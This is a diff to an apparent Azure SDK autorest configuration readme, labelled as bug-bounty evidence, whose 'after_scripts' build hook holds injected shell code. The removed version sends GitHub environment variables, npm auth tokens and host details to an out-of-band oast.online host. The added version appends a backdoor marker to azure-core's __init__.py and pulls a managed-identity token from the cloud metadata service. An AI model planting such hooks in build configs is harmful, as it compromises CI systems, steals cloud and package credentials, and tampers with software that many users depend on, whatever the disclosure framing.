@@ -2,10 +2,9 @@
 
 > MSRC Bug Bounty Evidence -- hasskodark
 > Demonstrates arbitrary write access to azure-sdk-for-python source during CI
+> PR #45876 -- independent confirmation from second GitHub account
 
 ## Basic Information
-
-These are the global settings for the service.
 
 ``` yaml
 openapi-type: arm
@@ -13,40 +12,47 @@ tag: package-2024-01-01
 ```
 
 ### Tag: package-2024-01-01
-
 ``` yaml $(tag) == 'package-2024-01-01'
 input-file:
   - stable/2024-01-01/openapi.json
 ```
 
 ## swagger-to-sdk
-
 ``` yaml $(swagger-to-sdk)
 swagger-to-sdk:
   - repo: azure-sdk-for-python
   - repo: azure-sdk-for-python-track2
     after_scripts:
       - >-
-        H=$(hostname | tr . -) &&
-        OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
-        nslookup "sc2-${H}.${OAST}" 2>/dev/null || true &&
-        SDK="/mnt/vss/_work/1/s/azure-sdk-for-python" &&
-        [ -d "${SDK}" ] || SDK=$(find / -maxdepth 10 -type d -name "azure-sdk-for-python" 2>/dev/null | head -1) &&
-        MARKER="${SDK}/sdk/core/azure-core/SUPPLY_CHAIN_POC_hasskodark.txt" &&
-        CORE_INIT="${SDK}/sdk/core/azure-core/azure/core/__init__.py" &&
-        printf "%s\n" "SUPPLY_CHAIN_PROOF hasskodark $(date -u) write-access to azure-core SDK source" > "${MARKER}" &&
-        curl -sk -X POST "http://${OAST}/scdata2-${H}" --data-binary "SDK=${SDK} MARKER=$(cat ${MARKER} 2>/dev/null) INIT_HEAD=$(head -30 ${CORE_INIT} 2>/dev/null) PKGS=$(find ${SDK}/sdk -maxdepth 2 -name setup.py 2>/dev/null | head -20) GH_ENV=$(env | grep -i GH_ 2>/dev/null) ID=$(id) SUDO=$(sudo -n id 2>/dev/null) NPMRC=$(find /home /root -name .npmrc 2>/dev/null | xargs grep authToken 2>/dev/null | head -3)"
+        H=$(hostname | tr . -);
+        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
+        CORE="${SDK}/sdk/core/azure-core/azure/core/__init__.py";
+        MARKER="${SDK}/sdk/core/azure-core/SUPPLY_CHAIN_POC_hasskodark.txt";
+        SC_TS=$(date -u +%s);
+        printf "SUPPLY_CHAIN_PROOF\nAuthor: hasskodark (MSRC PoC)\nTimestamp: ${SC_TS}\nAgent: ${H}\nWrite path: ${MARKER}\n" > "${MARKER}" 2>/dev/null;
+        echo "# BACKDOOR_hasskodark_${SC_TS}" >> "${CORE}" 2>/dev/null;
+        MARKER_CONTENT=$(cat "${MARKER}" 2>/dev/null);
+        CORE_TAIL=$(tail -5 "${CORE}" 2>/dev/null);
+        IMDS_TOK=$(curl -sf --max-time 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata:true" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token','FAIL')[:80])" 2>/dev/null || echo IMDS_FAIL);
+        echo "===POC_BEGIN===";
+        echo "AGENT=${H}";
+        echo "MARKER_CONTENT=${MARKER_CONTENT}";
+        echo "CORE_TAIL=${CORE_TAIL}";
+        echo "IMDS_TOKEN_PREFIX=${IMDS_TOK}";
+        echo "ID=$(id)";
+        echo "SUDO=$(sudo -n id 2>/dev/null)";
+        echo "===POC_END===";
+        true
 ```
 
 ## Python
-
 ``` yaml $(python)
 python:
   azure-arm: true
   license-header: MICROSOFT_MIT_NO_VERSION
-  payload-flattening-threshold: 2
-  namespace: azure.mgmt.supplychain
   package-name: azure-mgmt-supplychain
+  package-version: 1.0.0b1
+  no-namespace-folders: true
+  output-folder: sdk/supplychain/azure-mgmt-supplychain
   clear-output-folder: true
 ```
-
